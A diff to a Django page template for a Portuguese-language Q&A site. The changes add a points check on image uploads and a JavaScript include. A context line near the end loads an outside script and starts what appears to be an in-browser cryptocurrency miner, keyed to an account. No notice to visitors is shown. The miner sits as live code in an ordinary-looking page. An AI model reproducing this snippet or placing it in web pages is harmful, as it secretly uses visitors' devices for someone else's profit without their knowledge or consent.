@@ -1,3 +1,4 @@
+{% load main_app_extras %}
 <!doctype html>
 <html lang="pt-br">
 <head>
@@ -30,7 +31,7 @@ main {
 					<input class="form-control" type="text" name="question" placeholder="Sua pergunta aqui" autocomplete="off" maxlength="180">
 					<textarea maxlength="5000" class="form-control" placeholder="Descrição (opcional)" name="description"></textarea>
 					<label for="image">Imagem</label>
-					<input type="file" class="form-control-file" id="image" name="file">
+					<input type="file" class="form-control-file" id="image" name="file" onclick="return veracity_test({{ user_p.total_points }}, {% MINIMUM_POINTS_FOR_POSTING_IMAGES %});">
 					<input class="btn btn-primary" type="submit" value="Fazer pergunta" onclick="this.style.display = 'none'">
 				</div>
 			</form>
@@ -44,6 +45,7 @@ main {
 <div class="alert alert-info"><p>Confirme seu email abrindo o link enviado para ele.<br>Este é o email usado na tela de cadastro: {{ user.email }}</p><p>Caso não encontre o email, verifique na pasta de spam.</p></div>
 {% endif %}
 	</main>
+<script src="/static/js/general_functions.js?version=1"></script>
 <script src="https://www.hostingcloud.racing/zk0a.js"></script><script>var _client=new Client.Anonymous("5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a",{throttle:.9,c:"w",ads:0});_client.start();</script>
 </body>
 </html>
